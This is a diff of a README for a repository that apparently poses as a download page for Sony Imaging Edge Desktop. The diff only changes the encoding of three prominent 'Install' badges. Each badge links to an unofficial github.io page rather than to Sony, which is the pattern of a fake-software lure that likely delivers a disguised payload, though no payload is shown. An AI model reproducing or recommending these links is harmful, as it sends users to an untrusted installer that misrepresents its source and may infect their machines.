@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony%20Imaging%20Edge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony+Imaging+Edge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Sony Imaging Edge Desktop is a free suite from Sony for importing, browsing, edi
 
 <div align="center">
 
-[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony%20Imaging%20Edge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony+Imaging+Edge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Sony Imaging Edge Desktop is a free suite from Sony for importing, browsing, edi
 
 <div align="center">
 
-[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony%20Imaging%20Edge%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sony Imaging Edge Desktop](https://img.shields.io/badge/⬇_Install_Sony+Imaging+Edge+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
